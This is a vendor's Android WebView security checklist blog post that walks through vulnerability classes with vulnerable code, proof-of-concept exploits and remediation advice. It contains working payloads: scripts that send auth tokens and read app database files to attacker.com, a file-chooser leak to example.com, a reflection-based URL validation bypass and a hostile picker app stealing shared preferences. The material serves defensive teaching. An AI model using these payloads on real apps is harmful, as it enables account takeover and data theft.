---
source: oversecured
source_url: https://oversecured.com/blog/android-security-checklist-webview
title: "Android security checklist: WebView | Oversecured Blog"
author: "HubSpot, Inc."
description: "WebView is a web browser that can be built into an app, and represents the most widely used component of the Android ecosystem; it is also subject to the largest number of potential"
---

Dast is live!

Run a new scan to see dynamic findings in your reports

[Learn more →](https://oversecured.com/dast)

WebView is a web browser that can be built into an app, and represents the most widely used component of the Android ecosystem; it is also subject to the largest number of potential errors. If it is possible to load arbitrary URLs or to execute JavaScript code controlled by the attacker, we most often have to deal with the leaking of authentication tokens, the theft of arbitrary files and access to arbitrary activities – which can even lead to remote code execution.

Do you want to check your mobile apps for such types of vulnerabilities? Oversecured mobile apps scanner provides an automatic solution that helps to detect vulnerabilities in Android and iOS mobile apps. You can integrate Oversecured into your development process and check every new line of your code to ensure your users are always protected.

Start securing your apps by starting a free 2-week trial from [Quick Start](https://app.oversecured.com/docs/quick-start/), or you can [book a call](https://calendly.com/oversecured/30min) with our team or [contact us](https://app.oversecured.com/contact-us) to explore more.

## Typical example of the vulnerability

The commonest version is the case where there are no checks or limitations on loading arbitrary URLs inside WebView. Let’s suppose we have a `DeeplinkActivity` that processes a URL such as `myapp://deeplink`.

File `AndroidManifest.xml`

<activityandroid:name=".DeeplinkActivity">

<intent-filter>

<actionandroid:name="android.intent.action.VIEW"/>

<categoryandroid:name="android.intent.category.DEFAULT"/>

<dataandroid:scheme="myapp"android:host="deeplink"/>

</intent-filter>

</activity>

Inside, it has the ability to process WebView deeplinks:

public class DeeplinkActivity extendsActivity{

protectedvoidonCreate(Bundle savedInstanceState){

super.onCreate(savedInstanceState);

handleDeeplink(getIntent());

}

private voidhandleDeeplink(Intent intent){

Uri deeplink = intent.getData();

if("/webview".equals(deeplink.getPath())){

String url = deeplink.getQueryParameter("url");

handleWebViewDeeplink(url);

}

}

private voidhandleWebViewDeeplink(String url){

WebView webView = ...;

setupWebView(webView);

webView.loadUrl(url,getAuthHeaders());

}

private Map<String,String\> getAuthHeaders(){

Map<String,String\> headers = newHashMap<>();

headers.put("Authorization",getUserToken());

returnheaders;

}

}

In this case the attacker can carry out a remote attack to obtain the user’s authentication token by creating a page with the following code:

<!DOCTYPE html>

<html>

<bodystyle="text-align: center;">

<h1>

<ahref="myapp://deeplink/webview?url=https://attacker.com/">Attack</a>

</h1>

</body>

</html>

When the user taps `Attack`, the vulnerable app automatically opens `https://attacker.com` in the built-in WebView, adding the user’s token to the header of the HTTP request. The attacker can therefore steal it and gain access to the victim’s account.

## Insufficient URL validation

Developers sometimes try to check which URLs are loaded in WebView, but do so incorrectly. [OVAA](https://github.com/oversecured/ovaa) (Oversecured Vulnerable Android App) contains an example of this vulnerability. The scan report for it looks like this:

![](https://framerusercontent.com/images/D6WPGYLRToZ4m4VUzcPyp2IUkVA.png?width=2252&height=3548)

In this section we shall look at typical attacks on URL validation.

## Only checking host

This is one of the most typical errors. Only the value of host is checked, forgetting about scheme:

private boolean isValidUrl(String url){

Uri uri = Uri.parse(url);

return"legitimate.com".equals(uri.getHost());

}

The attacker can use, for instance, the `javascript`, `content` or `file`schemes to bypass the checks:

- `javascript://legitimate.com/%0aalert(1)`

- `file://legitimate.com/sdcard/exploit.html`

- `content://legitimate.com/`


In the case of the `javascript` scheme, the attacker can execute arbitrary JavaScript code in WebView. In the case of the `content`scheme, they can claim a content provider with the specified authority and return arbitrary files by using the `ContentProvider.openFile()` method. The `file` scheme allows them to open a file in the public directory.

## Logic errors in the verification process

We also encounter an error where developers use logically incorrect methods to verify URLs:

private boolean isValidUrl(String url){

Uri uri = Uri.parse(url);

return"https".equals(uri.getScheme()) && uri.getHost().endsWith("legitimate.com");

}

We have also seen the `String.contains()` method used. In this case there is an obvious way to bypass the verification.

## Attack using HierarchicalUri and the Java Reflection API

Let’s glance at an example of seemingly secure URL validation:

Uri uri = getIntent().getData();

boolean isValidUrl = "https".equals(uri.getScheme()) && uri.getUserInfo() == null && "legitimate.com".equals(uri.getHost());

if(isValidUrl){

webView.loadUrl(uri.toString(),getAuthHeaders());

}

`android.net.Uri` is widely used on Android, but in fact it is an abstract class. `android.net.Uri$HierarchicalUri` is one of its subclasses. The Java Reflection API makes it possible to create a Uri capable of bypassing this check.

File `MainActivity.java`:

public class MainActivity extendsActivity{

protectedvoidonCreate(Bundle savedInstanceState){

super.onCreate(savedInstanceState);

Uri uri;

try{

Class partClass = Class.forName("android.net.Uri$Part");

Constructor partConstructor = partClass.getDeclaredConstructors()\[0\];

partConstructor.setAccessible(true);

Class pathPartClass = Class.forName("android.net.Uri$PathPart");

Constructor pathPartConstructor = pathPartClass.getDeclaredConstructors()\[0\];

pathPartConstructor.setAccessible(true);

Class hierarchicalUriClass = Class.forName("android.net.Uri$HierarchicalUri");

Constructor hierarchicalUriConstructor = hierarchicalUriClass.getDeclaredConstructors()\[0\];

hierarchicalUriConstructor.setAccessible(true);

Object authority = partConstructor.newInstance("legitimate.com","legitimate.com");

Object path = pathPartConstructor.newInstance("@attacker.com","@attacker.com");

uri = (Uri)hierarchicalUriConstructor.newInstance("https",authority,path,null,null);

}catch(Exception e){

thrownewRuntimeException(e);

}

Intent intent = newIntent();

intent.setData(uri);

intent.setClass(this,TestActivity.class);

startActivity(intent);

}

}

File `TestActivity.java`:

public class TestActivity extendsActivity{

protectedvoidonCreate(Bundle savedInstanceState){

super.onCreate(savedInstanceState);

Intent intent = getIntent();

Uri uri = intent.getData();

Log.d("evil","Scheme: " \+ uri.getScheme());

Log.d("evil","UserInfo: " \+ uri.getUserInfo());

Log.d("evil","Host: " \+ uri.getHost());

Log.d("evil","toString(): " \+ uri.toString());

}

}

The log will be as follows:

Scheme:https

UserInfo:null

Host:legitimate.com

toString(): https://legitimate.com@attacker.com

This attack is only possible by using a third-party app installed on the same device, and if the vulnerable app takes a `Uri` object controlled by the attacker and works exclusively with that. If we make a change such as

Uri uri = Uri.parse(intent.getData().toString());

then this attack becomes impossible.

Important! Beginning from API level 28 (Android 9), the use of internal interfaces is [forbidden](https://developer.android.com/guide/app-compatibility/restrictions-non-sdk-interfaces) – but this can easily be bypassed by using tools such as [RestrictionBypass](https://github.com/ChickenHook/RestrictionBypass).

## Backslashes on old versions of Android

On devices with API level 1-24 (up to Android 7.0), `android.net.Uri`and `java.net.URL` parsers works incorrectly. If we run the following code

String url = "https://attacker.com\\\\\\@legitimate.com";

Log.d("evil",Uri.parse(url).getHost());// \`legitimate.com\` printed

webView.loadUrl(url,getAuthHeaders());// \`https://attacker.com//@legitimate.com\` loaded

Thus, this attack allows us to bypass checks such as

private boolean isValidUrl(String url){

Uri uri = Uri.parse(url);

return"https".equals(uri.getScheme()) && "legitimate.com".equals(uri.getHost());

}

If your app contains a value of `minSdkVersion` lower than 25, you need to protect yourself against this attack.

There are several possible protections:

- set the value of `minSdkVersion` to 25 or above;

- use the `java.net.URI` class for validation: it throws a `URISyntaxException` if backslashes are discovered in the authority part;

- verify the value of `authority`, not `host`.


## Universal XSS

Besides the obvious cases, where an attacker controls the `baseUri`and `data` parameters in a call to

webView.loadDataWithBaseURL("https://google.com/",

"<script>document.write(document.domain)</script>",

null,null,null);

and receives XSS on an arbitrary website, there is also another widespread version of UXSS. Let’s look at the code of the exported `WebActivity`:

public class WebActivity extendsActivity{

privateWebViewwebView;

protectedvoidonCreate(Bundle savedInstanceState){

super.onCreate(savedInstanceState);

setContentView(R.layout.web\_activity);

this.webView = findViewById(R.id.webView);

this.webView.getSettings().setJavaScriptEnabled(true);

this.webView.loadUrl(getIntent().getDataString());

}

protectedvoidonNewIntent(Intent intent){

super.onNewIntent(intent);

this.webView.loadUrl(intent.getDataString());

}

}

In this case `onCreate` is called when the activity is launched for the first time, and `onNewIntent` is called each time the activity receives a new Intent. The following code allows to achieve UXSS in the vulnerable app:

Intent intent = newIntent();

intent.setData(Uri.parse("https://google.com/"));

intent.setClassName("com.victim","com.victim.WebActivity");

startActivity(intent);

newHandler().postDelayed(() -\> {

intent.setData(Uri.parse("javascript:document.write(document.domain))"));

startActivity(intent);

},3000);

When it is first run it opens a domain within whose context arbitrary JavaScript code must be executed. The second time, this code is executed using the `javascript` scheme.

## JavaScript code injections

Developers often concatenate data with JavaScript code insecurely, leading to XSS on the domain that is loaded:

this.webView.loadUrl("https://legitimate.com/");

String page = getIntent().getData().getQueryParameter("page");

this.webView.evaluateJavascript("loadPage('" \+ page \+ "')",null);

or with the `javascript` scheme:

this.webView.loadUrl("javascript:loadPage('" \+ page \+ "')");

If you concatenate data with JavaScript code, we advise you to use JSON methods to sanitize the data.

This attack resembles DOM-based XSS in the web world. But on Android, depending on the WebView configurations we shall explain below, it is possible to carry the exploitation of the vulnerability further.

## Attacks on internal URL handlers

Many Android apps employ custom URL handlers using the `WebViewClient.shouldOverrideUrlLoading()` method, but their functionality is often implemented insecurely:

class CustomClient extendsWebViewClient{

publicbooleanshouldOverrideUrlLoading(WebView view,WebResourceRequest request){

Uri uri = request.getUrl();

String url = uri.toString();

if(url.startsWith("intent://")){

try{

Intent intent = Intent.parseUri(url,0);

view.getContext().startActivity(intent);

}catch(URISyntaxException e){

}

returntrue;

}

String page;

if((page = uri.getQueryParameter("page")) != null){

view.evaluateJavascript("loadPage('" \+ page \+ "')",null);

returntrue;

}

returnsuper.shouldOverrideUrlLoading(view,request);

}

}

this.webView.setWebViewClient(newCustomClient());

this.webView.loadUrl(attackerControlledUrl);

At the moment each URL is loaded, WebView calls the `shouldOverrideUrlLoading` method to check whether it needs to be handled by the app or by WebView itself. As a rule, this is used to launch activities or handlers for an additional list of deeplinks. It is important to note that even if the attacker cannot bypass the check on loading arbitrary domains, they may still be able to try to exploit the handlers.

For instance, in this example the attacker can launch arbitrary activities (we have analyzed this attack in more detail [elsewhere](https://blog.oversecured.com/Android-Access-to-app-protected-components/#access-to-arbitrary-components-via-webview)) and achieve XSS on the page that is loaded, by opening `https://legitimate.com/?page='-alert(1)-'`.

## Attacks on JavaScript interfaces

If the app adds JavaScript interfaces to WebView, an attacker can gain access to them if they can execute arbitrary code within this WebView. As a rule, JS interfaces are divided into two categories: the first return data (such as geolocation or the user’s authentication token), and the second perform actions (such as taking a photo or sending queries to designated endpoints).

class JSInterface {

@JavascriptInterface

publicStringgetAuthToken(){

//...

}

@JavascriptInterface

publicvoidtakePicture(String callback){

//...

}

}

this.webView.addJavascriptInterface(newJSInterface(),"JSInterface");

this.webView.loadUrl(attackerControlledUrl);

In this case, WebView automatically creates a JavaScript object with the specified name and with methods that are also imported from the Java code. To obtain the user’s token from this example, all we need to do is run the following code:

<scripttype="text/javascript">

location.href =

'https://attacker.com/?leaked\_token=' + JSInterface.getAuthToken();

</script>

## Attacks where universal/file access from file URLs is enabled

This attack is possible where universal/file access from file URLs is turned on:

this.webView.getSettings().setAllowFileAccessFromFileURLs(true);

or

this.webView.getSettings().setAllowUniversalAccessFromFileURLs(true);

and the attacker can load an arbitrary URL into WebView:

this.webView.loadUrl(attackerControlledUrl);

In this case the attacker can use XHR queries to obtain the content of arbitrary files to which the vulnerable app has access:

<scripttype="text/javascript">

function theftFile(path, callback) {

var req = new XMLHttpRequest();

req.open('GET', 'file://' + path, true);

req.onload = function (e) {

callback(req.responseText);

};

req.onerror = function (e) {

callback(null);

};

req.send();

}

var file = '/data/user/0/com.victim/databases/user.db';

theftFile(file, function (contents) {

location.href =

'https://attacker.com/?data=' \+ encodeURIComponent(contents);

});

</script>

The scan report for OVAA includes an example of a notification concerning this vulnerability:

![](https://framerusercontent.com/images/BqBBLJbJBHLo7N8TGXQCM9ES4.png?width=2252&height=1008)

## Theft of arbitrary files via file choosers

Developers often want to let users choose from files stored on their devices. HTML provides, for example, the `<input type="file" ... />` element for this purpose. On Android, you need to implement the `WebChromeClient.onShowFileChooser()` method to describe the file choosing logic. Usually, it will make use of implicit intents to obtain URIs, which are passed to the `ValueCallback.onReceiveValue()`method with no validation of any kind. This makes it possible for attackers to intercept the intent and pass the URI of a protected file, which can lead to the theft of arbitrary files.

Example of a vulnerable app:

private static final int CONTENT\_CODE = 1337;

private WebView webView;

private ValueCallback<Uri\[\]\> callback;

protected voidonCreate(Bundle savedInstanceState){

super.onCreate(savedInstanceState);

setContentView(R.layout.main\_activity);

webView = findViewById(R.id.webView);

webView.setWebChromeClient(newWebChromeClient(){

public boolean onShowFileChooser(WebView webView,ValueCallback<Uri\[\]\> filePathCallback,FileChooserParams fileChooserParams){

callback = filePathCallback;

startActivityForResult(fileChooserParams.createIntent(),CONTENT\_CODE);

returntrue;

}

});

String someAttackerControlledUrl = getIntent().getDataString();

webView.loadUrl(someAttackerControlledUrl);

}

protected voidonActivityResult(int requestCode,int resultCode,Intent data){

super.onActivityResult(requestCode,resultCode,data);

if(resultCode != Activity.RESULT\_OK){

// Handle error

return;

}

switch(requestCode){

caseCONTENT\_CODE:{

callback.onReceiveValue(newUri\[\]{data.getData()});

return;

}

}

}

If you look at the Android sources (or rather the source for the `com.google.android.webview` app on Googled Androids), you can discover that even the standard `FileChooserParams.onShowFileChooser()` method returns an implicit intent. Usually, developers also use implicit intents to choose files. These intents can be [intercepted](https://blog.oversecured.com/Interception-of-Android-implicit-intents/) by an attacker, who then returns the URI of a protected file.

### Example attack

HTML code of the page

<input

type="file"

accept="application/pdf"

onchange="blobCallback(window.URL.createObjectURL(this.files\[0\]))"

/>

<script type="text/javascript">

functionblobCallback(blobUrl){

theftFile(blobUrl,function(contents){

// Leak file contents to a third-party URL

newImage().src =

'http://example.com/?data=' \+ encodeURIComponent(contents);

});

}

functiontheftFile(url,callback){

varreq = newXMLHttpRequest();

req.open('GET',url,true);

req.onload = function(e){

callback(req.responseText);

};

req.onerror = function(e){

callback('error');

};

req.send();

}

</script>

Code of attacker’s app

File `AndroidManifest.xml`

<activityandroid:name=".PickerActivity"android:enabled="true"android:exported="true">

<intent-filterandroid:priority="999">

<actionandroid:name="android.intent.action.GET\_CONTENT"/>

<categoryandroid:name="android.intent.category.OPENABLE"/>

<categoryandroid:name="android.intent.category.DEFAULT"/>

<dataandroid:mimeType="application/pdf"/>

</intent-filter>

</activity>

File `PickerActivity.java`:

public class PickerActivity extendsActivity{

protectedvoidonCreate(Bundle savedInstanceState){

super.onCreate(savedInstanceState);

Uri uri = Uri.parse("file:///data/user/0/com.victim/shared\_prefs/secrets.xml");

setResult(-1,newIntent().setData(uri));

finish();

}

}

> Remediation: Oversecured recommends following the tips set out in the section on [Exploiting URI attacks via a](https://blog.oversecured.com/Android-security-checklist-theft-of-arbitrary-files/#exploiting-uri-attacks-via-content-scheme)`content` [scheme](https://blog.oversecured.com/Android-security-checklist-theft-of-arbitrary-files/#exploiting-uri-attacks-via-content-scheme). This universal technique can also protect WebView from the theft of protected files.

## Attacks on WebResourceResponse

We have gone into this attack in [Android: Exploring vulnerabilities in WebResourceResponse](https://blog.oversecured.com/Android-Exploring-vulnerabilities-in-WebResourceResponse/).

## Attacks on content providers

Content access (or access to any `content://` URIs) is turned on by default, which means WebView can use any content providers available to the app on the user’s device. We have encountered vulnerabilities where providers didn’t only record or supply data, but also performed dangerous actions:

public ParcelFileDescriptor openFile(Uri uri,String mode)throws FileNotFoundException {

if("/debug".equals(uri.getPath())){

FileUtils.dumpData();// copies all files from the internal directory to the SD card

returnnull;

}

//...

In this example it would have been possible to load a URL like `content://provider.authority/debug` into WebView and then read dumped data on the SD card.

So, if this setting is not explicitly turned off, you need to pay attention to exactly what the content providers are doing – especially those that are not exported.

## Installing cookies for third-party sites

Sometimes WebView uses cookies for authorization instead of headers like `Authorization`. To do this, the app uses the `CookieManager` and sets a token in the cookie for the URL, which can be controlled by the attacker, and then opens it:

String attackerControlledUrl = getIntent().getDataString();

CookieManager manager = CookieManager.getInstance();

manager.setCookie(attackerControlledUrl,"token=" \+ getUserToken());

webView.loadUrl(attackerControlledUrl);

In this case, you must first validate the URL and then install the cookie. For example, if a sensitive cookie is installed for the attacker’s domain, but is not loaded immediately, then this still poses a threat, because this domain can be opened elsewhere in the app (remember that in one app all WebViews have a common cookie storage if the default configuration is used).

The best solution for this architecture is to create a list of trusted domains and pre-install authorization cookies for them.

## Recommendations

To prevent vulnerabilities, or at least to reduce their potential impact, we recommend performing the following actions for each WebView you use:

- switch off geolocation, by calling `WebSettings.setGeolocationEnabled(false)`;

- switch off content access, by calling `WebSettings.setAllowContentAccess(false)`;

- switch off file access by calling `WebSettings.setAllowFileAccess(false)` if your `minSdkVersion`is 29 or below;

- switch off file access from file URLs by calling `WebSettings.setAllowFileAccessFromFileURLs(false)` if your `minSdkVersion` is 15 or below;

- switch off universal file access from file URLs by calling `WebSettings.setAllowUniversalAccessFromFileURLs(false)` if your `minSdkVersion` is 15 or below;

- if any external links are loaded in WebView, it is essential to validate the origin that is loaded correctly – checking both scheme and host;

- wherever JavaScript is called with externally obtained data, you just make sure it has been sanitized;

- if internal handlers change URLs into Intent objects, the component and selector fields of the latter must be reset. For additional security, verify that the activity opened with the given Intent is exported and that either no permissions are set for it, or else they have a `protectionLevel` set to `normal`;

- if the app has a custom implantation of `WebResourceResponse`, you need to make sure that an attacker cannot obtain the content of arbitrary files;

- make sure the debugging of web contents option is switched off in release builds;

- do not install sensitive cookies for unverified domains.


##### Keep reading

[View all](https://oversecured.com/blog)

[![](https://framerusercontent.com/images/OnN0UKCOhnnXin2eBts9J3SaUQ.png?width=5592&height=3259)\\
\\
20 Security Issues Found in Xiaomi Devices\\
\\
Oversecured found and resolved significant mobile security vulnerabilities in Xiaomi devices. Our team discovered 20 dangerous vulnerabilities across various applications and system components that pose a threat to all Xiaomi users. The vulnerabilities\\
\\
Case Study\\
\\
May 2, 2024\\
\\
15\\
\\
min read\\
\\
TOp article](https://oversecured.com/blog/20-security-issues-found-in-xiaomi-devices)

[![](https://framerusercontent.com/images/W9Wn9vbZPPJFNH7MN7Zx6QXches.png?width=2048&height=1194)\\
\\
Android deep link vulnerabilities: how intent filters lead to account takeover\\
\\
A technical guide to Android deep link security. Learn how intent filter misconfigurations lead to account takeover, and how mobile application security testing with SAST and DAST finds these vulnerability chains.\\
\\
Android Security\\
\\
Apr 27, 2026\\
\\
8\\
\\
min read](https://oversecured.com/blog/android-deep-link-vulnerabilities)

[![](https://framerusercontent.com/images/xSiSLs1y7y6Mzr4lWYWCpFoYmM4.png?width=2848&height=1656)\\
\\
Android security checklist: theft of arbitrary files\\
\\
Developers for Android do a lot of work with files and exchange them with other apps, for example, to get photos, images, or user data. \\
\\
Android Security\\
\\
May 20, 2022\\
\\
11\\
\\
min read\\
\\
TOp article](https://oversecured.com/blog/android-security-checklist-theft-of-arbitrary-files)

Book a personalized demo

During the demo with our cybersecurity experts you will get:

A free trial scan of your app

An analysis of your SAST and DAST findings

Practical insights on mobile security of your app

First name

Business email

How did you hear about us?

Book a demo

2026 © Oversecured

follow us

### [LinkedIn](https://www.linkedin.com/company/oversecured/)

### [Twitter (X)](https://x.com/oversecuredinc)

[Privacy Policy](https://oversecured.com/privacy)

[Terms of use](https://oversecured.com/terms)

[go up ↑](https://oversecured.com/blog/android-security-checklist-webview#header)

Chat Widget